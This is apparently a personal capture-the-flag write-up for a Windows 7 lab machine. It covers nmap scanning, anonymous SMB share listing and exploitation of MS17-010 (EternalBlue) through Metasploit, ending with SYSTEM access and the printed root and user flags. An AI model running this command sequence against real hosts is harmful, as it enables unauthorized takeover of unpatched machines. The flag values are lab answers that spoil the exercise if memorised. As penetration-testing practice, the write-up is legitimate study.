...
##### **Conclusion**
**Time :** 1h01
	**Start :** 01.02.2025 / 15:01
	**Break at/to :** 
	**Finish :** 01.02.2025 / 16:02
**Satisfaction :**  9/10 Because nobody helps me I made it alone.

### 1. **Reconnaissance

First we make a #nmap scan :

```BASH
nmap -p- -sV 10.129.53.207
```
...
Let's go add the `-Pn` param :

```BASH
nmap -p- -sV -Pn 10.129.53.207
```

It's fucking slow...
So we make another command :

```BASH
nmap -sV -Pn 10.129.53.207
```
...
We can see that we have a #windows machine.

With another @nmap scan we can see that is an #SMB machine :

Command :

```BASH
nmap -sCV -Pn 10.129.53.207
```
...
Host script results:
| smb2-time: 
|   date: 2025-02-01T14:16:25
|_  start_date: 2025-02-01T13:53:52
| smb-os-discovery: 
...
|_  System time: 2025-02-01T14:16:27+00:00
...
We also see that is a Windows 7 Professional 6.1 OS.

With #smbClient we Can list the shares available :

Command :

```BASH
smbclient -L 10.129.53.207 -N
```

`-L` for list
`-N` for #anonymousAccess 
...
We connect to Shares via #anonymousAccess but there is nothing and in Public there's nothing interesting.

When we make some researches on google with `Windows 7 Professional 6.1` we can see a video about #MS17-010. It's an exploit that the ransomware/worm WannaCry has use.

## 2. **Weaponization

On #exploitDB we have find an exploit so let's try it.
...
After install all the credential we can try to exploit.

## 3. **Delivery

## 4. **Exploitation

The exploit doesn't work so let's go try with #Metasploit.

```BASH
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.53.207
...
We are connected as `NT AUTHORITY\SYSTEM`

## 7. **Actions on Objectives

Lets go get all the flags :
...
100444/r--r--r--  34    fil   2025-02-01 07:54:31 -0600  root.txt
```

```BASH
(Meterpreter 1)(C:\Users\Administrator\Desktop) > cat root.txt 
d490edaf00578ab838a98e67cc0619bf
```

We have the root.

Now go find the user flag.
...
100444/r--r--r--  34    fil   2025-02-01 07:54:31 -0600  user.txt
```

```BASH
(Meterpreter 1)(C:\Users\haris\Desktop) > cat user.txt 
4715a550aec90a4936dc3df8c5520990
```
